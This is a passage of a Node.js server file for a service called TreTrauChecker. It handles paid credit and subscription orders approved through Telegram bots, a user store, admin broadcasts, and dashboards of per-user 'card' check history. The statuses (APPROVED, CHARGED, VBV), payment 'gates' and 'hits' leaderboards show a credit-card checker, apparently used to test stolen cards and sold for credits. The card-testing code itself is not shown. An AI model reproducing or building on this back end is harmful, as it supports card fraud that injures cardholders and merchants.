        ].join('\n');
        const opts = { parse_mode: 'Markdown', reply_markup: { inline_keyboard: [[
            { text: `✅ Approve (${plan.label})`, callback_data: `approve_sub_${orderId}` },
            { text: '❌ Reject', callback_data: `reject_sub_${orderId}` }
        ]] } };
        await payBot.sendMessage(PAY_GROUP_ID, msg, opts);
        const photoPath = path.join(UPLOAD_PATH, req.file.filename);
        await payBot.sendPhoto(PAY_GROUP_ID, fs.createReadStream(photoPath), {
            caption: `📸 Sub #${orderId} | ${req.username} | ${plan.label} | $${plan.price} | ${method}`
        });
    } catch (e) { console.error('[PayBot Sub]', e.message); }
    res.json({ success: true, message: `Subscription order #${orderId} submitted. Pending approval.`, orderId });
});

app.get('/api/subscription/mine', authMiddleware, (req, res) => {
    const db = readDB();
    const orders = Object.values(db.subOrders || {}).filter(o => o.username === req.username).sort((a,b) => new Date(b.createdAt)-new Date(a.createdAt));
    res.json({ success: true, orders });
});

// ===== STORE =====
app.get('/api/store', authMiddleware, (req, res) => {
    const db = readDB();
    const items = (db.store || []).filter(i => !i.deleted).sort((a,b) => new Date(b.createdAt)-new Date(a.createdAt));
    res.json({ success: true, items });
});

app.post('/api/store', authMiddleware, upload.single('image'), async (req, res) => {
    const db = readDB();
    const u = db.users[req.username];
    if (!SUBSCRIPTION_PLANS[u?.plan]) return res.json({ success: false, message: 'Premium subscription required to sell in store.' });
    const { title, description, price, telegram } = req.body;
    if (!title || !description || !price || !telegram) return res.json({ success: false, message: 'title, description, price and telegram required.' });
    const priceNum = parseFloat(price);
    if (isNaN(priceNum) || priceNum <= 0 || priceNum > 10000) return res.json({ success: false, message: 'Invalid price.' });
    if (!db.store) db.store = [];
    const item = {
        id: crypto.randomBytes(8).toString('hex'),
        username: req.username,
        title: title.substring(0, 100),
        description: description.substring(0, 500),
        price: priceNum,
        telegram: telegram.replace(/^@/, '').substring(0, 50),
        image: req.file ? req.file.filename : null,
        createdAt: new Date().toISOString(),
    };
    db.store.push(item);
    writeDB(db);
    res.json({ success: true, item });
});

app.delete('/api/store/:id', authMiddleware, (req, res) => {
    const db = readDB();
    const idx = (db.store || []).findIndex(i => i.id === req.params.id && i.username === req.username);
    if (idx === -1) return res.json({ success: false, message: 'Not found.' });
    db.store.splice(idx, 1);
    writeDB(db);
    res.json({ success: true });
});

// ===== PROFILE UPDATE =====
app.patch('/api/user/profile', authMiddleware, upload.single('bgImage'), async (req, res) => {
    const db = readDB();
    const u = db.users[req.username];
    if (!u) return res.json({ success: false, message: 'User not found.' });
    const isPremium = !!SUBSCRIPTION_PLANS[u.plan];

    // All users: update Telegram username
    if (req.body.telegramUsername !== undefined) {
        const tg = String(req.body.telegramUsername).replace(/^@/, '').substring(0, 50);
        u.telegramUsername = tg;
    }

    // Premium only features
    if (isPremium) {
        if (req.body.glitterName !== undefined) u.glitterName = req.body.glitterName === 'true' || req.body.glitterName === true;
        if (req.body.nameColor) u.nameColor = String(req.body.nameColor).substring(0, 20);
        if (req.file) {
            if (u.bgImage) { try { fs.unlinkSync(path.join(UPLOAD_PATH, u.bgImage)); } catch {} }
            u.bgImage = req.file.filename;
        }
        if (req.body.removeBg === 'true') {
            if (u.bgImage) { try { fs.unlinkSync(path.join(UPLOAD_PATH, u.bgImage)); } catch {} }
            u.bgImage = null;
        }
    }

    db.users[req.username] = u;
    writeDB(db);

    const planConf = SUBSCRIPTION_PLANS[u.plan] || null;
    res.json({ success: true, user: {
        username: u.username, email: u.email, credits: u.credits,
        plan: u.plan, planExpiry: u.planExpiry || null,
        maxThreads: planConf ? planConf.threads : 5,
        dailyCredits: planConf ? planConf.dailyCredits : 0,
        telegramUsername: u.telegramUsername || '',
        glitterName: u.glitterName || false,
        nameColor: u.nameColor || '#ffffff',
        bgImage: u.bgImage || null,
        createdAt: u.createdAt, confirmedBy: u.confirmedBy, isAdmin: req.username === ADMIN_USERNAME || !!u.isAdmin,
    }});
});

// ===== TELEGRAM BOTS =====
const bot    = new TelegramBot(BOT_TOKEN,     { polling: true });
const payBot = new TelegramBot(PAY_BOT_TOKEN, { polling: true });

// Fetch bot username at startup for Telegram Login Widget
bot.getMe().then(me => { BOT_USERNAME = me.username; console.log(`[Bot] @${BOT_USERNAME} ready`); }).catch(() => {});

// payBot callback handler — approve/reject credit and subscription orders
payBot.on('callback_query', async (query) => {
    const chatId = query.message?.chat?.id;
    const data   = query.data || '';
    const msgId  = query.message?.message_id;

    const ack = (text) => {
        payBot.answerCallbackQuery(query.id, { text }).catch(() => {});
        if (chatId && msgId) payBot.editMessageReplyMarkup({ inline_keyboard: [] }, { chat_id: chatId, message_id: msgId }).catch(() => {});
    };

    // ── Credit order ──────────────────────────────────────────────────────────
    if (data.startsWith('approve_') && !data.startsWith('approve_sub_')) {
        const orderId = data.replace('approve_', '');
        const db = readDB();
        const order = (db.orders || {})[orderId];
        if (!order || order.status !== 'pending') return ack('Already processed.');
        const user = db.users[order.username];
        if (!user) return ack('User not found.');
        db.users[order.username].credits = Math.round((db.users[order.username].credits + order.credits) * 100) / 100;
        db.orders[orderId].status = 'approved';
        db.orders[orderId].approvedBy = 'paybot';
        db.orders[orderId].approvedAt = new Date().toISOString();
        writeDB(db);
        ack(`✅ Approved +${order.credits} credits for ${order.username}`);
        try { if (user.telegramId) bot.sendMessage(user.telegramId, `✅ *Payment Approved!*\n\n💰 +*${order.credits}* credits added!\nNew balance: *${db.users[order.username].credits}*\nOrder: #${orderId}`, { parse_mode: 'Markdown' }); } catch {}
        if (chatId) payBot.sendMessage(chatId, `✅ Order #${orderId} approved. +${order.credits} cr → ${order.username}`).catch(() => {});
    }

    if (data.startsWith('reject_') && !data.startsWith('reject_sub_')) {
        const orderId = data.replace('reject_', '');
        const db = readDB();
        const order = (db.orders || {})[orderId];
        if (!order || order.status !== 'pending') return ack('Already processed.');
        db.orders[orderId].status = 'rejected';
        db.orders[orderId].rejectedAt = new Date().toISOString();
        writeDB(db);
        ack(`❌ Rejected order #${orderId}`);
        if (chatId) payBot.sendMessage(chatId, `❌ Order #${orderId} rejected.`).catch(() => {});
    }

    // ── Subscription order ────────────────────────────────────────────────────
    if (data.startsWith('approve_sub_')) {
        const orderId = data.replace('approve_sub_', '');
        const db = readDB();
        const order = (db.subOrders || {})[orderId];
        if (!order || order.status !== 'pending') return ack('Already processed.');
        const user = db.users[order.username];
        if (!user) return ack('User not found.');
        const plan = SUBSCRIPTION_PLANS[order.planId];
        if (!plan) return ack('Invalid plan.');
        const now = new Date();
        const alreadyActive = user.plan === order.planId && user.planExpiry && new Date(user.planExpiry) > now;
        const baseDate = alreadyActive ? new Date(user.planExpiry) : now;
        baseDate.setDate(baseDate.getDate() + plan.durationDays);
        user.plan = order.planId;
        user.planExpiry = baseDate.toISOString();
        db.subOrders[orderId].status = 'approved';
        db.subOrders[orderId].approvedBy = 'paybot';
        db.subOrders[orderId].approvedAt = new Date().toISOString();
        writeDB(db);
        ack(`✅ ${plan.label} activated for ${order.username}`);
        try { if (user.telegramId) bot.sendMessage(user.telegramId, `👑 *${plan.label} Plan Activated!*\n\n📅 Expires: *${baseDate.toISOString().substring(0,10)}*\n💰 Daily: *${plan.dailyCredits} cr/day*`, { parse_mode: 'Markdown' }); } catch {}
        if (chatId) payBot.sendMessage(chatId, `✅ Sub #${orderId} approved. ${plan.label} → ${order.username} (expires ${baseDate.toISOString().substring(0,10)})`).catch(() => {});
    }

    if (data.startsWith('reject_sub_')) {
        const orderId = data.replace('reject_sub_', '');
        const db = readDB();
        const order = (db.subOrders || {})[orderId];
        if (!order || order.status !== 'pending') return ack('Already processed.');
        db.subOrders[orderId].status = 'rejected';
        db.subOrders[orderId].rejectedAt = new Date().toISOString();
        writeDB(db);
        ack(`❌ Rejected sub #${orderId}`);
        if (chatId) payBot.sendMessage(chatId, `❌ Sub #${orderId} rejected.`).catch(() => {});
    }
});

// Pending /thongbao broadcasts awaiting confirmation
const pendingBroadcast = new Map();


// ----- Main bot -----
bot.onText(/\/start(?:\s+(.+))?/, async (msg, match) => {
    const chatId = msg.chat.id;
    const code = (match[1] || '').trim().toUpperCase();

    if (code && tgVerifyCodes.has(code)) {
        const entry = tgVerifyCodes.get(code);
        if (Date.now() > entry.exp) {
            tgVerifyCodes.delete(code);
            return bot.sendMessage(chatId, `❌ Code *${code}* has expired. Please request a new code on the registration page.`, { parse_mode: 'Markdown' });
        }
        if (entry.verified) {
            return bot.sendMessage(chatId, `✅ This code has already been verified. Please continue registration.`, { parse_mode: 'Markdown' });
        }
        const tgId = String(msg.from.id);
        // Check if this Telegram account is already linked
        const db = readDB();
        const alreadyLinked = Object.values(db.users).some(u => u.telegramId === tgId);
        if (alreadyLinked) {
            return bot.sendMessage(chatId,
                `❌ Your Telegram account is already linked to a TreTrauChecker account.\n\nPlease login with your existing account instead.`);
        }
        entry.verified = true;
        entry.tgId = tgId;
        entry.tgUsername = msg.from.username || '';
        entry.tgFirstName = msg.from.first_name || '';
        const display = msg.from.username ? `@${msg.from.username}` : msg.from.first_name || String(msg.from.id);
        bot.sendMessage(chatId,
            `✅ *Telegram Verified!*\n\nUserName : ${display}\nId : ${tgId}\n\nYou can now complete registration on the website.`,
            { parse_mode: 'Markdown' });
    } else {
        bot.sendMessage(chatId,
            `🛡️ *TreTrauChecker Bot*\n\nWelcome!\n\n📋 *Commands:*\n/balance <user> — Check credits\n/help — Help\n\n🔐 To verify your Telegram for registration, go to the registration page and click *"Get Verify Code"*, then send:\n/start <CODE>`,
            { parse_mode: 'Markdown' });
    }
});
bot.onText(/\/help/, (msg) => {
    bot.sendMessage(msg.chat.id,
        `🛡️ *TreTrauChecker — Help*\n\n/balance <user> — Check credits\n\n💰 Free: ${FREE_CREDITS} credits on signup`,
        { parse_mode: 'Markdown' });
});
bot.onText(/\/balance(?:\s+(.+))?/, (msg, match) => {
    const chatId = msg.chat.id;
    const args = match[1] ? match[1].trim().split(/\s+/) : [];
    if (!args[0]) return bot.sendMessage(chatId, `❌ *Usage:* /balance <username>`, { parse_mode: 'Markdown' });
    const db = readDB();
    const user = db.users[args[0].toLowerCase()];
    if (!user) return bot.sendMessage(chatId, `❌ User not found.`, { parse_mode: 'Markdown' });
    bot.sendMessage(chatId, `💰 *${user.username}*\nCredits: *${user.credits}* ($${(user.credits*0.1).toFixed(2)})\nPlan: *${user.plan}*`, { parse_mode: 'Markdown' });
});

// /thongbao — admin-only broadcast notification to all web users
bot.onText(/\/thongbao(?:\s+([\s\S]+))?/, async (msg, match) => {
    const chatId = msg.chat.id;
    const text = match[1]?.trim();
    if (!text) return bot.sendMessage(chatId, `❌ Usage: /thongbao <message>`);
    if (msg.from.id !== ADMIN_ID) {
        return bot.sendMessage(chatId, '🚫 Only admin can broadcast notifications.');
    }
    pendingBroadcast.set(msg.from.id, text);
    bot.sendMessage(chatId,
        `📢 *Preview Notification:*\n\n${text}\n\nReply /xacnhan to publish, /huy to cancel.`,
        { parse_mode: 'Markdown' });
});
bot.onText(/\/xacnhan/, async (msg) => {
    const text = pendingBroadcast.get(msg.from.id);
    if (!text) return;
    pendingBroadcast.delete(msg.from.id);
    const db = readDB();
    db.notification = { text, active: true, createdAt: new Date().toISOString() };
    writeDB(db);
    bot.sendMessage(msg.chat.id, `✅ *Notification published!*\n\nAll users will see it on the dashboard.\nSend /xoanotify to remove it.`, { parse_mode: 'Markdown' });
});
bot.onText(/\/huy/, (msg) => {
    pendingBroadcast.delete(msg.from.id);
    bot.sendMessage(msg.chat.id, '❌ Broadcast cancelled.');
});
bot.onText(/\/xoanotify/, async (msg) => {
    if (msg.from.id !== ADMIN_ID) return;
    const db = readDB();
    if (db.notification) db.notification.active = false;
    writeDB(db);
    bot.sendMessage(msg.chat.id, '🗑️ Notification cleared.');
});


// ===== INTERNAL PAY API (called by pay.py — localhost only) =====
app.post('/internal/approve/:orderId', internalLimiter, internalOnly, (req, res) => {
    const orderId = req.params.orderId.toUpperCase();
    const approvedBy = req.body.approvedBy || 'bot';
    const db = readDB();
    if (!db.orders) return res.json({ success: false, message: 'No orders.' });
    const order = db.orders[orderId];
    if (!order) return res.json({ success: false, message: 'Order not found.' });
    if (order.status !== 'pending') return res.json({ success: false, message: `Already ${order.status}.` });
    if (!db.users[order.username]) return res.json({ success: false, message: 'User not found.' });
    db.users[order.username].credits = Math.round((db.users[order.username].credits + order.credits) * 100) / 100;
    db.orders[orderId].status = 'approved';
    db.orders[orderId].approvedBy = approvedBy;
    db.orders[orderId].approvedAt = new Date().toISOString();
    writeDB(db);
    const newBal = db.users[order.username].credits;
    try {
        const user = db.users[order.username];
        if (user.telegramId) {
            bot.sendMessage(user.telegramId,
                `✅ *Payment Approved!*\n\n💰 +*${order.credits}* credits added!\nNew balance: *${newBal}* credits\n\nOrder: #${orderId}`,
                { parse_mode: 'Markdown' });
        }
    } catch {}
    res.json({ success: true, order, newBalance: newBal });
});

app.post('/internal/reject/:orderId', internalLimiter, internalOnly, (req, res) => {
    const orderId = req.params.orderId.toUpperCase();
    const db = readDB();
    if (!db.orders?.[orderId]) return res.json({ success: false, message: 'Order not found.' });
    if (db.orders[orderId].status !== 'pending') return res.json({ success: false, message: `Already ${db.orders[orderId].status}.` });
    db.orders[orderId].status = 'rejected';
    db.orders[orderId].rejectedBy = req.body.rejectedBy || 'bot';
    db.orders[orderId].rejectedAt = new Date().toISOString();
    writeDB(db);
    res.json({ success: true });
});

app.post('/internal/addcredit', internalLimiter, internalOnly, (req, res) => {
    const { username, amount } = req.body;
    const amt = parseFloat(amount);
    if (!username || isNaN(amt) || amt <= 0 || amt > 50000) return res.json({ success: false, message: 'Invalid username or amount.' });
    const db = readDB();
    if (!db.users[username]) return res.json({ success: false, message: 'User not found.' });
    db.users[username].credits = Math.round((db.users[username].credits + amt) * 100) / 100;
    writeDB(db);
    res.json({ success: true, newBalance: db.users[username].credits });
});

app.post('/internal/ban', internalLimiter, internalOnly, (req, res) => {
    const { username, ip } = req.body;
    const db = readDB();
    if (!db.banned) db.banned = [];
    if (!db.banned_ips) db.banned_ips = [];
    if (username && !db.banned.includes(username)) db.banned.push(username);
    if (ip && !db.banned_ips.includes(ip)) db.banned_ips.push(ip);
    writeDB(db);
    res.json({ success: true });
});

app.get('/internal/orders/pending', internalLimiter, internalOnly, (req, res) => {
    const db = readDB();
    const pending = Object.values(db.orders || {}).filter(o => o.status === 'pending');
    res.json({ success: true, orders: pending });
});

app.post('/internal/notify', internalLimiter, internalOnly, (req, res) => {
    const { text } = req.body;
    const db = readDB();
    db.notification = { text, active: true, createdAt: new Date().toISOString() };
    writeDB(db);
    res.json({ success: true });
});

app.post('/internal/approve_sub/:orderId', internalLimiter, internalOnly, (req, res) => {
    const orderId = req.params.orderId.toUpperCase();
    const db = readDB();
    const order = (db.subOrders || {})[orderId];
    if (!order) return res.json({ success: false, message: 'Sub order not found.' });
    if (order.status !== 'pending') return res.json({ success: false, message: `Already ${order.status}.` });
    const user = db.users[order.username];
    if (!user) return res.json({ success: false, message: 'User not found.' });
    const plan = SUBSCRIPTION_PLANS[order.planId];
    if (!plan) return res.json({ success: false, message: 'Invalid plan.' });

    const now = new Date();
    const alreadyActive = user.plan === order.planId && user.planExpiry && new Date(user.planExpiry) > now;
    const baseDate = alreadyActive ? new Date(user.planExpiry) : now;
    baseDate.setDate(baseDate.getDate() + plan.durationDays);

    user.plan = order.planId;
    user.planExpiry = baseDate.toISOString();
    db.subOrders[orderId].status = 'approved';
    db.subOrders[orderId].approvedBy = req.body.approvedBy || 'bot';
    db.subOrders[orderId].approvedAt = new Date().toISOString();
    writeDB(db);

    try {
        if (user.telegramId) {
            bot.sendMessage(user.telegramId,
                `👑 *${plan.label} Plan Activated!*\n\nYour subscription is now active.\n📅 Expires: *${baseDate.toISOString().substring(0,10)}*\n💰 Daily credits: *${plan.dailyCredits} cr/day*\n🔢 Threads: *${plan.threads}*`,
                { parse_mode: 'Markdown' });
        }
    } catch {}
    res.json({ success: true, order, planExpiry: baseDate.toISOString() });
});

app.post('/internal/reject_sub/:orderId', internalLimiter, internalOnly, (req, res) => {
    const orderId = req.params.orderId.toUpperCase();
    const db = readDB();
    if (!db.subOrders?.[orderId]) return res.json({ success: false, message: 'Not found.' });
    if (db.subOrders[orderId].status !== 'pending') return res.json({ success: false, message: `Already ${db.subOrders[orderId].status}.` });
    db.subOrders[orderId].status = 'rejected';
    db.subOrders[orderId].rejectedAt = new Date().toISOString();
    writeDB(db);
    res.json({ success: true });
});

// ===== DASHBOARD =====
app.get('/api/dashboard', authMiddleware, (req, res) => {
    touchOnline(req.username);
    const db = readDB();
    const topUsers = Object.values(db.users)
        .filter(u => !db.banned?.includes(u.username))
        .sort((a, b) => (b.credits || 0) - (a.credits || 0))
        .slice(0, 5)
        .map(u => ({ username: u.username, credits: u.credits || 0 }));
    const today = new Date().toISOString().substring(0, 10);
    const gateStats = {};
    let checksToday = 0, liveToday = 0;
    Object.values(db.users).forEach(u => {
        (u.history || []).filter(h => h.ts && h.ts.startsWith(today)).forEach(h => {
            checksToday++;
            if (h.status === 'APPROVED' || h.status === 'CHARGED') liveToday++;
            const g = h.gate || 'Unknown';
            if (!gateStats[g]) gateStats[g] = { gate: g, count: 0 };
            gateStats[g].count++;
        });
    });
    const activeGates = Object.keys(gateStats).length;
    const topGates = Object.values(gateStats).sort((a, b) => b.count - a.count).slice(0, 6);
    const maxGateCount = topGates[0]?.count || 1;
    const totalUsers = Object.keys(db.users).length;
    const newUsersToday = Object.values(db.users).filter(u => u.confirmedAt && u.confirmedAt.startsWith(today)).length;
    const feed = (db.feed || []).slice(0, 60);
    const weekAgo = new Date(Date.now() - 7 * 24 * 60 * 60 * 1000).toISOString();
    const leaderboard = Object.values(db.users)
        .map(u => {
            const hist = (u.history || []).filter(h => h.ts >= weekAgo);
            return { username: u.username, checks: hist.length, live: hist.filter(h => h.status === 'APPROVED' || h.status === 'CHARGED').length };
        })
        .filter(u => u.checks > 0)
        .sort((a, b) => b.checks - a.checks)
        .slice(0, 10);
    // All-time hits ranking (top 100, sorted by APPROVED+CHARGED count)
    const rankHits = Object.values(db.users)
        .filter(u => !db.banned?.includes(u.username))
        .map(u => {
            const hist = u.history || [];
            const hits = hist.filter(h => h.status === 'APPROVED' || h.status === 'CHARGED').length;
            const total = hist.length;
            return { username: u.username, hits, total };
        })
        .filter(u => u.hits > 0)
        .sort((a, b) => b.hits - a.hits)
        .slice(0, 100);
    const latency = 80 + Math.floor(Math.random() * 80);
    res.json({ success: true, topUsers, topGates, maxGateCount, feed, leaderboard, rankHits, latency, online: getOnlineCount(), checksToday, liveToday, totalUsers, newUsersToday, activeGates });
});

// ===== USER STATS =====
app.get('/api/user/stats', authMiddleware, (req, res) => {
    const db = readDB();
    const history = db.users[req.username]?.history || [];
    const total = history.length;
    const approved = history.filter(h => h.status === 'APPROVED' || h.status === 'CHARGED').length;
    const declined = history.filter(h => h.status === 'DECLINED').length;
    const vbv = history.filter(h => h.status === 'VBV').length;
    const error = history.filter(h => h.status === 'ERROR').length;
    const successRate = total ? Math.round((approved / total) * 100) : 0;
    const byGate = {};
    history.forEach(h => {
        const key = h.gate || 'Unknown';
        if (!byGate[key]) byGate[key] = { gate: key, total: 0, approved: 0 };
        byGate[key].total++;
        if (h.status === 'APPROVED' || h.status === 'CHARGED') byGate[key].approved++;
    });
    const byGateArr = Object.values(byGate).sort((a, b) => b.total - a.total);
    res.json({ success: true, total, approved, declined, vbv, error, successRate, byGate: byGateArr });
});

// ===== USER HISTORY =====
app.get('/api/user/history', authMiddleware, (req, res) => {
    const db = readDB();
    const history = db.users[req.username]?.history || [];
    const { search = '', status = '', page = '1' } = req.query;
    let filtered = history;
    if (search) filtered = filtered.filter(h => h.card.includes(search));
    if (status) {
        const s = status.toUpperCase();
        // LIVE = APPROVED + CHARGED combined
        if (s === 'LIVE') filtered = filtered.filter(h => h.status === 'APPROVED' || h.status === 'CHARGED');
        else filtered = filtered.filter(h => h.status === s);
    }
    const PAGE_SIZE = 50;
    const pageNum = Math.max(1, parseInt(page) || 1);
    const total = filtered.length;
    const items = filtered.slice((pageNum - 1) * PAGE_SIZE, pageNum * PAGE_SIZE);
    const counts = {
        total: history.length,
        live: history.filter(h => h.status === 'APPROVED').length,
        charged: history.filter(h => h.status === 'CHARGED').length,
        declined: history.filter(h => h.status === 'DECLINED').length,
        vbv: history.filter(h => h.status === 'VBV').length,
        error: history.filter(h => h.status === 'ERROR').length,
    };
    res.json({ success: true, items, total, page: pageNum, pageSize: PAGE_SIZE, counts });
});

// ===== 404 =====
app.use((req, res) => {
    res.status(404).sendFile(path.join(__dirname, '..', 'public', '404.html'));
});

// ===== START =====
app.listen(PORT, () => {
    console.log(`\n  🛡️  TreTrauChecker Server`);
    console.log(`  ➜  http://localhost:${PORT}`);
    console.log(`  ➜  Dashboard: http://localhost:${PORT}/dashboard`);
    console.log(`  ➜  Telegram Bots: Active\n`);
});
